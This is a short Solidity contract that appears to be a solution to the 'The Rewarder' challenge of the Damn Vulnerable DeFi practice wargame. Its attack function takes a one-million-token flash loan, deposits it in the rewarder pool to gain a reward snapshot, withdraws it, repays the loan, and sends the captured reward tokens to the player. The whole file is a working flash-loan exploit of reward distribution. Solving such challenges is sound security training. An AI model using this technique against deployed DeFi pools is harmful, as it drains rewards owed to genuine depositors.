// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract AttackRewarder {

    DamnValuableToken dvt;
    RewardToken rwt;
    FlashLoanerPool flashloanPool;
    TheRewarderPool rewarder;
    address player;

    constructor(address _flashloanPool, address _rewarder, address _player) {
        flashloanPool = FlashLoanerPool(_flashloanPool);
        dvt = FlashLoanerPool(_flashloanPool).liquidityToken();
        rewarder = TheRewarderPool(_rewarder);
        rwt = TheRewarderPool(_rewarder).rewardToken();
        player = _player;
    }

    function attack() public {
        flashloanPool.flashLoan(1_000_000 ether);
        rwt.transfer(player, rwt.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public {
        require(msg.sender == address(flashloanPool));
        dvt.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        dvt.transfer(address(flashloanPool), amount);
    }
}